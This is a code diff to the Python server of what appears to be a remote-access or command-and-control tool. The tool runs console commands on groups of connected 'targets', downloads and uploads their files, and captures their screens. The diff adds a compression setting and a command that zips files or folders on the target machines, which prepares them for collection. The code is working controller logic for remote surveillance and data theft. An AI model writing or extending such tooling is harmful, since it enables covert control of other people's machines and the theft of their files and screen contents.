@@ -11,6 +11,7 @@ import texttable
 class Server:
     def __init__(self):
         self.cmd_timeout = 30
+        self.zip_compression_level = 0
         self.connection = Connection()
 
         while True:
@@ -21,7 +22,7 @@ class Server:
 
                 if command == "h":
                     self.print_help()
-                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout"]:
+                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout", "zip_compression"]:
                     self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                 elif command == "l" and len(attribute) == 1:
                     self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
@@ -38,8 +39,9 @@ class Server:
                 elif command == "u" and len(attribute) == 3:
                     self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                 elif command == "s" and len(attribute) == 3:
-                    # TODO less @
-                    self.make_screenshot(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
+                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[2].split()))
+                elif command == "z" and len(attribute) == 3:
+                    self.zip_file_or_folder(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                 elif command == "x":
                     self.connection.sock.close()
                     break
@@ -58,7 +60,8 @@ class Server:
         print("c [command] @ [group(s) or index(s)]  execute console command (Win: 'chcp 65001' for unicode encoding)")
         print("d [path to open] @ [path to save] @ [group(s) or index(s)] download a file from target")
         print("u [path to open] @ [path to save] @ [group(s) or index(s)] upload a file to target")
-        print("s [monitor] @ [path_to_save] @ [group(s) or index(s)] capture screenshot")
+        print("s [monitor] [path_to_save] @ [group(s) or index(s)] capture screenshot")
+        print("z [path_to_open] @ [path_to_save] @ [group(s) or index(s)]")
         print("x exit server")
 
     def generate_texttable(self, connections):
@@ -77,6 +80,14 @@ class Server:
                 self.cmd_timeout = int(value)
             except ValueError:
                 print("[-] InvalidTimeout")
+        elif option == "zip_compression":
+            try:
+                if int(value) not in range(10):
+                    print("[-] InvalidCompressionLevel")
+                else:
+                    self.zip_compression_level = int(value)
+            except ValueError:
+                print("[-] InvalidCompressionLevel")
         else:
             print("[-] UnknownOption")
 
@@ -175,6 +186,16 @@ class Server:
             try:
                 data = ("s" + monitor + " " + path_to_save).encode(self.connection.CODEC)
                 self.connection.send(data, connection)
+                response = self.connection.recv(connection).decode(self.connection.CODEC)
+                if response.startswith("[-]"):
+                    print(response)
+            except socket.error as error:
+                print("[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
+
+    def zip_file_or_folder(self, path_to_open, path_to_save, connections):
+        for connection in connections:
+            try:
+                self.connection.send(("z" + str(self.zip_compression_level) + path_to_open + " @ " + path_to_save).encode(self.connection.CODEC), connection)
                 response = self.connection.recv(connection).decode(self.connection.CODEC)
                 if response.startswith("[-]"):
                     print(response)
